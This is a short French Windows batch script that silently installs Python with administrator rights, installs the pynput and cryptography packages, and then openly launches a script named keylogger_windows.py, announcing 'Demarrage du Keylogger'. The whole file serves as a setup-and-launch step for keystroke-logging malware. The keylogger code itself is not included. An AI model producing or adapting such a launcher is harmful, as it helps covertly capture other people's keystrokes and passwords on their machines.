@echo off
title INSTALLATION ROBINET (METHODE DIRECTE)
color 0B

echo.
echo ========================================================
echo      INSTALLATION DE PYTHON (METHODE DIRECTE)
echo ========================================================
echo [INFO] Ce script doit etre execute en Administrateur.
echo.

:: 1. Verifie si Python est present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ACTION] Telechargement de Python 3.11...
    
    :: Telechargement de l'installateur avec curl (integre a Windows)
    curl -o python_installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
    
    echo.
    echo [ACTION] Installation silencieuse en cours...
    echo [INFO] Veuillez patienter, l'installateur s'execute en arriere-plan...
    
    :: Installation silencieuse. C'est l'etape qui echouait.
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    :: Nettoyage
    del python_installer.exe
    
    echo.
    echo [SUCCES] Python installe.
) else (
    echo [OK] Python est deja present.
)


:: 2. VERIFICATION FINALE ET LANCEMENT
echo.
echo ========================================================

:: Utilisation de la nouvelle instance Python
python -m pip install pynput cryptography

if %errorlevel% equ 0 (
    echo [SUCCES] Pynput installe.
    echo [LANCEMENT] Demarrage du Keylogger...
    python keylogger_windows.py
) else (
    color 0C
    echo [ERREUR CRITIQUE] Echec de l'installation de Pynput.
)

pause
